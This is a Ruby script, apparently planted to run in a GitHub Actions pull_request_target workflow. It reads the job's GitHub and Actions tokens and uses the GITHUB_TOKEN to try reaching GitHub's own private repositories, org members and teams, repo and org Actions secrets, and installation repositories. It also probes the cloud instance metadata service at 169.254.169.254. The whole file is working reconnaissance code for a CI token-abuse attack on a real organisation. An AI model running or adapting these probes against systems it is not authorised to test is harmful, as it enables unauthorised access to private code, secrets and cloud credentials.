require 'net/http'
require 'json'
require 'uri'

$stdout.puts "========================================="
$stdout.puts "BOUNDARY TEST: pull_request_target token scope"
$stdout.puts "========================================="

token = ENV['GITHUB_TOKEN']
runtime_token = ENV['ACTIONS_RUNTIME_TOKEN']
id_token_url = ENV['ACTIONS_ID_TOKEN_REQUEST_URL']
id_token_tok = ENV['ACTIONS_ID_TOKEN_REQUEST_TOKEN']
cache_url = ENV['ACTIONS_CACHE_URL']

$stdout.puts "GITHUB_TOKEN present: #{!token.nil? && !token.empty?}"
$stdout.puts "GITHUB_TOKEN length: #{token&.length}"
$stdout.puts "ACTIONS_RUNTIME_TOKEN present: #{!runtime_token.nil? && !runtime_token.empty?}"
$stdout.puts "ACTIONS_RUNTIME_TOKEN length: #{runtime_token&.length}"
$stdout.puts "ACTIONS_ID_TOKEN_REQUEST_URL: #{id_token_url}"
$stdout.puts "ACTIONS_ID_TOKEN_REQUEST_TOKEN present: #{!id_token_tok.nil? && !id_token_tok.empty?}"
$stdout.puts "ACTIONS_CACHE_URL: #{cache_url}"

$stdout.puts ""
$stdout.puts "=== ENV DUMP (names only, no values) ==="
ENV.each { |k, _| $stdout.puts "  ENV: #{k}" }

if token && !token.empty?
  $stdout.puts ""
  $stdout.puts "=== GITHUB_TOKEN SCOPE TEST ==="

  uri = URI("https://api.github.com/")
  http = Net::HTTP.new(uri.host, uri.port)
  http.use_ssl = true

  # Test 1: What scopes does the token have?
  req = Net::HTTP::Get.new("/repos/github/explore")
  req["Authorization"] = "Bearer #{token}"
  req["Accept"] = "application/vnd.github+json"
  res = http.request(req)
  $stdout.puts "1. GET /repos/github/explore: #{res.code}"
  $stdout.puts "   X-OAuth-Scopes: #{res['X-OAuth-Scopes']}"
  $stdout.puts "   X-Accepted-OAuth-Scopes: #{res['X-Accepted-OAuth-Scopes']}"
  $stdout.puts "   X-RateLimit-Remaining: #{res['X-RateLimit-Remaining']}"

  # Test 2: Can we list org repos? (cross-boundary)
  req2 = Net::HTTP::Get.new("/orgs/github/repos?type=all&per_page=5&sort=updated")
  req2["Authorization"] = "Bearer #{token}"
  req2["Accept"] = "application/vnd.github+json"
  res2 = http.request(req2)
  $stdout.puts ""
  $stdout.puts "2. GET /orgs/github/repos?type=all: #{res2.code}"
  if res2.code == "200"
    repos = JSON.parse(res2.body)
    repos.each { |r| $stdout.puts "   repo: #{r['full_name']} private=#{r['private']} visibility=#{r['visibility']}" }
  end

  # Test 3: Can we access a known private repo?
  req3 = Net::HTTP::Get.new("/repos/github/github")
  req3["Authorization"] = "Bearer #{token}"
  req3["Accept"] = "application/vnd.github+json"
  res3 = http.request(req3)
  $stdout.puts ""
  $stdout.puts "3. GET /repos/github/github (monorepo): #{res3.code}"

  # Test 4: Can we list org members?
  req4 = Net::HTTP::Get.new("/orgs/github/members?per_page=3")
  req4["Authorization"] = "Bearer #{token}"
  req4["Accept"] = "application/vnd.github+json"
  res4 = http.request(req4)
  $stdout.puts ""
  $stdout.puts "4. GET /orgs/github/members: #{res4.code}"

  # Test 5: Can we list org teams?
  req5 = Net::HTTP::Get.new("/orgs/github/teams?per_page=3")
  req5["Authorization"] = "Bearer #{token}"
  req5["Accept"] = "application/vnd.github+json"
  res5 = http.request(req5)
  $stdout.puts ""
  $stdout.puts "5. GET /orgs/github/teams: #{res5.code}"

  # Test 6: Can we read Actions secrets metadata?
  req6 = Net::HTTP::Get.new("/repos/github/explore/actions/secrets")
  req6["Authorization"] = "Bearer #{token}"
  req6["Accept"] = "application/vnd.github+json"
  res6 = http.request(req6)
  $stdout.puts ""
  $stdout.puts "6. GET /repos/github/explore/actions/secrets: #{res6.code}"
  if res6.code == "200"
    secrets = JSON.parse(res6.body)
    $stdout.puts "   total_count: #{secrets['total_count']}"
    secrets['secrets']&.each { |s| $stdout.puts "   secret: #{s['name']} created=#{s['created_at']}" }
  end

  # Test 7: Can we read org-level secrets?
  req7 = Net::HTTP::Get.new("/orgs/github/actions/secrets?per_page=5")
  req7["Authorization"] = "Bearer #{token}"
  req7["Accept"] = "application/vnd.github+json"
  res7 = http.request(req7)
  $stdout.puts ""
  $stdout.puts "7. GET /orgs/github/actions/secrets: #{res7.code}"

  # Test 8: Can we list other repo's contents?
  req8 = Net::HTTP::Get.new("/repos/github/docs/contents/README.md")
  req8["Authorization"] = "Bearer #{token}"
  req8["Accept"] = "application/vnd.github+json"
  res8 = http.request(req8)
  $stdout.puts ""
  $stdout.puts "8. GET /repos/github/docs/contents/README.md: #{res8.code}"

  # Test 9: Installation token scope check
  req9 = Net::HTTP::Get.new("/installation/repositories?per_page=5")
  req9["Authorization"] = "Bearer #{token}"
  req9["Accept"] = "application/vnd.github+json"
  res9 = http.request(req9)
  $stdout.puts ""
  $stdout.puts "9. GET /installation/repositories: #{res9.code}"
end

$stdout.puts ""
$stdout.puts "=== NETWORK TEST ==="
begin
  uri_meta = URI("http://169.254.169.254/latest/meta-data/")
  http_meta = Net::HTTP.new(uri_meta.host, uri_meta.port)
  http_meta.open_timeout = 3
  http_meta.read_timeout = 3
  req_meta = Net::HTTP::Get.new(uri_meta.path)
  res_meta = http_meta.request(req_meta)
  $stdout.puts "Metadata service (169.254.169.254): #{res_meta.code}"
  $stdout.puts "Body: #{res_meta.body[0..200]}"
rescue => e
  $stdout.puts "Metadata service: #{e.class} #{e.message}"
end

$stdout.puts ""
$stdout.puts "========================================="
$stdout.puts "END BOUNDARY TEST"
$stdout.puts "========================================="
$stdout.flush